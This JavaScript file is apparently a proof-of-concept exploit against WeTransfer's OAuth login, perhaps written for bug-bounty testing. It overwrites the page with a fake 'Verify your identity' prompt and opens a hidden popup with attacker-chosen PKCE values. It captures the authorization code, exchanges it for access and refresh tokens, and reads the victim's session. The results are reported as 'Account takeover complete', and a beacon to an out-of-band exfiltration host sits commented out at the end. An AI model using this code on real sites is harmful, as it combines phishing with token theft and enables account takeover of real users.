const EXFIL_URL = 'https://0jik82y5uzt15l0l8n1yaw137185g83b0.oast.site/exfil';

(async () => {
  // Generate PKCE pair (attacker-controlled)
  const codeVerifier = Array.from(crypto.getRandomValues(new Uint8Array(32)), b => b.toString(16).padStart(2, '0')).join('');
  const codeChallenge = btoa(String.fromCharCode(...new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(codeVerifier))))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  const state = Array.from(crypto.getRandomValues(new Uint8Array(32)), b => b.toString(16).padStart(2, '0')).join('');

  const params = new URLSearchParams({
    prompt: 'none',
    client_id: 'dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc',
    response_type: 'code',
    redirect_uri: 'https://wetransfer.com/account/silent-callback',
    scope: 'openid email profile offline_access',
    audience: 'aud://transfer-api-prod.wetransfer/',
    code_challenge: codeChallenge,
    code_challenge_method: 'S256',
    state: state
  });
  const authUrl = 'https://auth.wetransfer.com/authorize?' + params.toString();

  // Take over the page with a fake WeTransfer verification prompt
  // The click provides the user gesture needed for window.open
  document.open();
  document.write(`
    <html>
    <head><title>WeTransfer - Verify your identity</title></head>
    <body style="margin:0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;height:100vh;">
      <div style="background:#fff;border-radius:12px;padding:40px;max-width:400px;text-align:center;box-shadow:0 2px 10px rgba(0,0,0,.1);">
        <img src="https://wetransfer.com/favicon.ico" style="width:48px;height:48px;margin-bottom:16px;">
        <h2 style="margin:0 0 8px;color:#333;">Session Expired</h2>
        <p style="color:#666;margin:0 0 24px;">Please verify your identity to continue using WeTransfer.</p>
        <button id="verify-btn" style="background:#409FFF;color:#fff;border:none;padding:12px 32px;border-radius:8px;font-size:16px;cursor:pointer;">Verify Identity</button>
        <p id="status" style="color:#999;font-size:13px;margin-top:16px;"></p>
        <pre id="result" style="background:#f0f0f0;padding:10px;max-height:300px;overflow:auto;display:none;text-align:left;font-size:11px;border-radius:4px;"></pre>
      </div>
    </body>
    </html>
  `);
  document.close();

  document.getElementById('verify-btn').addEventListener('click', async () => {
    const results = { attack: 'auth_code_theft', domain: document.domain, ts: Date.now() };
    results.pkce = { code_verifier: codeVerifier, code_challenge: codeChallenge, state: state };
    const statusEl = document.getElementById('status');
    const resultEl = document.getElementById('result');

    statusEl.textContent = 'Verifying...';

    try {
      // Step 1: User gesture allows window.open — popup bypasses X-Frame-Options
      const popup = window.open(authUrl, '_blank', 'width=1,height=1,left=-9999,top=-9999');
      if (!popup) throw new Error('Popup blocked');

      // Step 2: Poll popup URL — after Auth0 redirects to wetransfer.com, it's same-origin
      const code = await new Promise((resolve, reject) => {
        const timer = setInterval(() => {
          try {
            if (popup.closed) { clearInterval(timer); reject(new Error('Popup closed')); return; }
            if (popup.location.href.includes('silent-callback')) {
              clearInterval(timer);
              const url = new URL(popup.location.href);
              popup.close();
              resolve(url.searchParams.get('code'));
            }
          } catch (e) {
            // Still cross-origin (auth.wetransfer.com), keep polling
          }
        }, 100);
        setTimeout(() => { clearInterval(timer); try { popup.close(); } catch(e) {} reject(new Error('timeout')); }, 10000);
      });

      results.auth_code = code;
      statusEl.textContent = 'Auth code captured. Exchanging for tokens...';

      // Step 3: Exchange code for tokens using attacker's code_verifier
      if (code) {
        const tokenResp = await fetch('https://auth.wetransfer.com/oauth/token', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            grant_type: 'authorization_code',
            client_id: 'dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc',
            code: code,
            code_verifier: codeVerifier,
            redirect_uri: 'https://wetransfer.com/account/silent-callback'
          })
        });
        const tokenData = await tokenResp.json();
        results.token = { status: tokenResp.status, access_token: tokenData.access_token, refresh_token: tokenData.refresh_token, id_token: tokenData.id_token };

        // Step 4: Read victim account with stolen token
        if (tokenData.access_token) {
          const sessionResp = await fetch('/api/v4/auth/session', {
            headers: { 'Authorization': 'Bearer ' + tokenData.access_token }
          });
          results.session = { status: sessionResp.status, body: await sessionResp.json() };
        }
      }

      statusEl.textContent = 'Account takeover complete.';
      resultEl.style.display = 'block';
      resultEl.textContent = JSON.stringify(results, null, 2);
    } catch (e) {
      results.error = e.message;
      statusEl.textContent = 'Error: ' + e.message;
      resultEl.style.display = 'block';
      resultEl.textContent = JSON.stringify(results, null, 2);
    }

    // Exfiltrate
    // navigator.sendBeacon(EXFIL_URL, JSON.stringify(results));
  });
})();
